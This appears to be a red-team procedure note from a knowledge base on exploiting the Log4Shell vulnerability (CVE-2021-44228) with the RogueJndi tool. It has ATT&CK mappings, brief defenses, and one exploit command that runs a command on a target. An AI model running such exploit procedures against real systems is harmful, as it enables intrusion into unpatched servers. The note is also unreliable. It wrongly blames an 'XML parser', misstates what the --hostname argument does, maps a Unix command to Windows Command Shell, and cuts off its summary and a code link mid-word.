---
id: e77c3233-7e6b-48a1-a0f3-b1a53484bfd2
name: CVE-2021-44228 Log4Shell Remote Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:56.775882+00:00'
updated_at: '2023-04-06T03:55:56.787454+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Exploitation for Defense Evasion|T1211 - Exploitation for Defense Evasion]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
sub_techniques:
- '[[Windows Command Shell|T1059.003 - Windows Command Shell]]'
tags:
- '[[CVE-2021-44228 Log4Shell]]'
- '[[Exploitation]]'
- '[[Remote Command Execution]]'
commands:
- '[[Execute RogueJndi-1.1.jar]]'
---

# CVE-2021-44228 Log4Shell Remote Command Execution

## Summary

CVE-2021-44228, also known as Log4Shell, is a vulnerability in the Apache Log4j library that allows remote attackers to execute arbitrary code on affected systems. The vulnerability is caused by a flaw in the Log4j XML parser that can be exploited by sending specially crafted requests to affected a

## Description

# Description

CVE-2021-44228, also known as Log4Shell, is a vulnerability in the Apache Log4j library that allows remote attackers to execute arbitrary code on affected systems. The vulnerability is caused by a flaw in the Log4j XML parser that can be exploited by sending specially crafted requests to affected applications. Attackers can use this vulnerability to execute arbitrary code with the privileges of the affected application, which could lead to full compromise of the system. This procedure demonstrates how to exploit the vulnerability to achieve remote command execution on a target system.

 

## Requirements

1. Access to a vulnerable Log4j library on the target system.

1. Network access to the target system.

 

## Defense

1. Upgrade to a patched version of Apache Log4j.

1. Implement network segmentation to limit access to affected applications.

1. Monitor network traffic for suspicious activity related to the Log4Shell vulnerability.

 

## Objectives

1. Exploit the Log4Shell vulnerability to achieve remote command execution on the target system.

 

# Instructions

1. Execute the following command to exploit the Log4Shell vulnerability and achieve remote command execution on the target system:

 



**Code**: [[java -jar target/RogueJndi-1.1.jar --command "touc]]



> This command uses the Rogue JNDI tool to exploit the Log4Shell vulnerability and achieve remote command execution on the target system. The `--command` argument specifies the command to execute on the target system, and the `--hostname` argument specifies the IP address or hostname of the target system. The output of the command includes the mapping of LDAP URIs to controller classes.



**Command** ([[Execute RogueJndi-1.1.jar]]):

```bash
java -jar target/RogueJndi-1.1.jar --command "touch /tmp/toto" --hostname "192.168.1.21"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Exploitation for Defense Evasion|T1211 - Exploitation for Defense Evasion]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

### Sub-Techniques

- [[Windows Command Shell|T1059.003 - Windows Command Shell]]

## Commands Used

- [[Execute RogueJndi-1.1.jar]]

## Tags

- [[CVE-2021-44228 Log4Shell]]
- [[Exploitation]]
- [[Remote Command Execution]]


